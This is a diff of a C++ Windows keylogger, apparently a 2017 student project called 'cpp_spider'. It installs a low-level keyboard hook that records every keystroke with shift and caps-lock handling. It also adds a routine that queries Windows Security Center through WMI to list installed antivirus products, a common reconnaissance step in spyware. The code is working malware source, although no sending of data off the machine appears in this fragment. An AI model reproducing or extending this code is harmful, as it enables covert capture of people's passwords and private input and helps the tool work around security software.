@@ -1,7 +1,21 @@
+//
+// KeyLogger.cpp for cpp_spider in /mnt/c/Users/Public/Projets/Tek3/cpp_spider/sources
+//
+// Made by Jeremy Thoveron
+// Login   <jeremy.thoveron-@epitech.net>
+//
+// Started on  Fri Sep 29 16:21:07 2017 Jeremy Thoveron
+// Last update Fri Sep 29 16:21:22 2017 Jeremy Thoveron
+//
+
 #include	"KeyLogger.hpp"
 #include	<iphlpapi.h>
 #include	<iomanip>
+#include 	<comdef.h>
+#include 	<Wbemidl.h>
+#include	<atlbase.h>
 
+#pragma comment(lib, "wbemuuid.lib")
 #pragma comment(lib, "IPHLPAPI.lib")
 
 HHOOK hookKeyboard;
@@ -60,7 +74,7 @@ void WindowsKeyLogger::getMacAddr()
   PIP_ADAPTER_INFO 	pAdapterInfo;
   DWORD  		buffer;
   DWORD			status;
-  char			mac_addr[18];
+
   buffer = sizeof(AdapterInfo);
   status = GetAdaptersInfo(AdapterInfo, &buffer);
   if (status == ERROR_SUCCESS)
@@ -80,6 +94,87 @@ void WindowsKeyLogger::getMacAddr()
   }
 }
 
+void	WindowsKeyLogger::getOperatingSystem()
+{
+#ifdef _WIN32
+  std::cout << "Windows" << std::endl;
+#endif
+#ifdef _linux
+  std::cout << "Linux" << std::endl;
+#endif
+}
+
+void WindowsKeyLogger::getAntiVirus()
+{
+  HRESULT hres;
+  IWbemLocator *locator = 0;
+  IWbemServices *services = nullptr;
+  IEnumWbemClassObject *pEnumerator = nullptr;
+  IWbemClassObject *object = nullptr;
+  ULONG uReturn = 0;
+
+  hres = CoInitializeEx(nullptr, 0);
+  if (FAILED(hres))
+  {
+    std::cerr << "Failed to initialize COM library" << std::endl;
+    return ;
+  }
+
+  hres = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
+  if (FAILED(hres))
+  {
+    std::cerr << "Failed to initialize security" << std::endl;
+    return ;
+  }
+
+  hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&locator);
+  if (FAILED(hres))
+  {
+    std::cerr << "Fail to to create IWbemLocator object" << std::endl;
+    return ;
+  }
+
+  hres = locator->ConnectServer(_bstr_t(L"root\\SecurityCenter2"), nullptr, nullptr, nullptr, 0, nullptr, nullptr, &services);
+  if (FAILED(hres))
+  {
+    std::cerr << "Fail to connect" << std::endl;
+    return ;
+  }
+
+  hres = CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
+  if (FAILED(hres))
+  {
+    std::cerr << "Could not set proxy blanket" << std::endl;
+    return ;
+  }
+
+  wchar_t *query = bstr_t("Select * From AntiVirusProduct");
+  hres = services->ExecQuery(bstr_t("WQL"), bstr_t("Select * From AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator);
+  if (FAILED(hres))
+  {
+    std::cerr << "Query for antivirus name failed" << std::endl;
+    return ;
+  }
+
+  while (pEnumerator)
+  {
+    pEnumerator->Next(WBEM_INFINITE, 1, &object, &uReturn);
+    if (0 == uReturn)
+    {
+      break;
+    }
+    CComVariant cvtVersion;
+    std::string	antivirus;
+    object->Get(L"displayName", 0, &cvtVersion, 0, 0);
+    antivirus = CW2A(cvtVersion.bstrVal);
+    std::cout << antivirus << std::endl;
+  }
+  services->Release();
+  locator->Release();
+  pEnumerator->Release();
+  CoUninitialize();
+}
+
 LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
 {
   PKBDLLHOOKSTRUCT 	content;
@@ -90,14 +185,11 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
   bool			capslock;
   short			value;
 
-  //faire un tableau de correspondance pour les premières touches du clavier qui ont une majuscule différente.
-  // je choisis le clavier sur lequel je vais faire mes correspondances
-  // Prendre azerty dans un premier temps
   shift = false;
   if (GetAsyncKeyState(VK_SHIFT))
     shift = true;
   value = GetKeyState(VK_CAPITAL);
-  if (value & 1 == 1)
+  if ((value & 1) == 1)
     capslock = true;
   else
     capslock = false;
@@ -117,18 +209,26 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
     str = static_cast<std::string>(tmp);
     if (str.length() <= 1)
     {
-      str = tolower(str[0]);
-      if (shift == true ^ capslock == true)
-	str = toupper(str[0]);
-     std::cout << str;
+      if ((shift == true) ^ (capslock == true))
+      {
+	try
+	{
+	  str = WindowsKeyLogger::correlingTable.at(static_cast<int>(str[0]));
+	}
+	catch (std::out_of_range const &)
+	{
+	  str = toupper(str[0]);
+	}
+      }
+      else
+	str = tolower(str[0]);
+      std::cout << str;
     }
     else
     {
       try
       {
 	str = WindowsKeyLogger::keys.at(content->vkCode);
-	if (str == "Caps Lock")
-	  capslock = !capslock;
 	std::cout << str;
       }
       catch (std::out_of_range const &)
